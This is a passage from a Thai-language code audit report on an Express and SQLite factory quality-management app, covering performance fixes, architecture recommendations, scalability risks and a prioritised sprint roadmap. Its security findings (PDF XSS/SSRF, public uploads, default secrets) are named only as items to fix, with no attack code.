| `GET /master/products` | ไม่ paginate + N+1 | LIMIT + batch/JOIN |
| `GET /bills` | correlated subquery ซ้อน 3 ชั้น | aggregate/denormalize count |
| Reports | aggregate ใน JS | aggregate ใน SQL |
| Index | ขาด FK index | เพิ่มตาม M4 |
| PDF | Chromium/req | pool + queue |
| SQLite | ไม่มี busy_timeout | `pragma busy_timeout=5000` |
| bcrypt | sync rounds 12 บล็อค event loop | คงไว้ได้ แต่ระวัง login burst / พิจารณา worker |
| SSE | in-memory Map | Redis ถ้า multi-instance |

---

## 8. Architecture Recommendation

**ระยะสั้น (คงสถาปัตยกรรมเดิม):** Express monolith + SQLite ยัง "พอ" สำหรับ in-plant scale แต่ต้องเติม: service layer, migration framework, notify module, security middleware (helmet/rate-limit), file storage แยก auth

**ถ้าจะโตจริง (หลายโรงงาน/หลาย instance):**
- **DB:** SQLite → PostgreSQL (แก้ single-writer, ได้ row-level lock จริง, FK/constraint แข็งแรง) — schema ปัจจุบัน port ได้ไม่ยาก
- **Realtime:** SSE + Redis pub-sub (หรือ Postgres LISTEN/NOTIFY)
- **PDF:** worker pool / microservice แยก + ปิด network
- **File:** object storage (S3/MinIO) + signed URL แทน static public
- **Layer:** `routes → controllers → services → repositories` แยก business logic ออกจาก HTTP

**สิ่งที่ไม่ต้องเปลี่ยน (ดีอยู่แล้ว):** React Query, optimistic lock pattern, atomic sequence, audit-in-transaction, role middleware, geofence server-side

---

## 9. Future / Scalability / Maintainability Risk

**Future Risk:** เพิ่มสถานะ NCR/UAI ใหม่ = rebuild ตาราง (TD-1) → ทุก feature ใหม่มีต้นทุนเสี่ยงสูง; PDF XSS อาจถูกใช้จริงเมื่อมี supplier ภายนอกจำนวนมาก
**Scalability Risk:** single-writer SQLite + SSE in-memory + Chromium/req + unpaginated lists = เพดานชัดเมื่อ user/ข้อมูลโต
**Maintainability Risk:** ไม่มี test (refactor เสี่ยง), logic กระจายใน route, notify copy-paste, `database.js` 956 บรรทัด, CLAUDE.md ไม่ตรง implementation (transactions.js/sequences.js ไม่มีจริง)

---

## 10. Priority Roadmap

```
Sprint 1 (Security, ก่อน prod)   : C1 C2 C3 H1 H2 H3 H9  + helmet + busy_timeout
Sprint 2 (Compliance & Correct)  : H6 H7 H8 M1 M4 M5 M8 M9
Sprint 3 (Stability)             : M2 M3 M6 M7 M10 + migration framework (แก้ราก H4/TD-1)
Sprint 4 (Refactor)              : service layer, notify module, แตก database.js, ลบ dead code (L1)
Sprint 5 (Scale & Test)          : pagination products/reports, SSE→Redis, PDF pool, ชุดเทสต์ (ดู TESTCASES.md)
```

---

## 11. สรุปสำหรับผู้บริหารโครงการ

- **ควรรีบแก้ก่อนสุด:** C1 (PDF XSS/SSRF), C3 (upload + uploads สาธารณะ), C2 (secrets/รหัส default), H1 (cookie secure), H2 (rate limit) — ทั้งหมดเป็น security ที่ block production
- **Technical debt อันตรายสุด:** ระบบ migration ของตาราง `ncrs` (TD-1/H4) — รากของความเปราะคือการใช้ CHECK constraint บน status ทำให้ต้อง rebuild ตารางทุกครั้ง แก้ที่รากจะลดความเสี่ยงระยะยาวมากที่สุด
- **ถ้าจะ Scale จะติด:** SQLite single-writer, SSE in-memory, PDF Chromium ต่อ request, list ที่ไม่ paginate (products/reports) — 4 จุดนี้คือเพดานจริง
- **จุดแข็งที่ควรรักษา:** workflow state machine, transaction + optimistic lock, audit trail, geofence, Excel import/export ที่มีวินัย — สถาปัตยกรรมแกนดี เพียงต้องอุดความปลอดภัยและหนี้ migration
```
```
```

> หมายเหตุความครอบคลุม: ฝั่ง server อ่านเต็มทุกไฟล์. ฝั่ง client อ่านเต็ม: api.js, AuthContext, useSSE, rolePermissions, App.jsx, AppLayout, Login, Supplier/NCRResponse (แหล่ง input ของ C1) และตรวจ pattern (dangerouslySetInnerHTML, auto-draft, idle, storage) ทั่วทุกหน้า — หน้า UI ขนาดใหญ่ (Dashboard, Delivery, Bills/New, NCR/Detail, UAI/Detail, Products) ตรวจเชิง pattern ไม่ได้ไล่ทุกบรรทัด หากต้องการ deep-dive ราย component (re-render/memo/accessibility) แจ้งเพิ่มได้
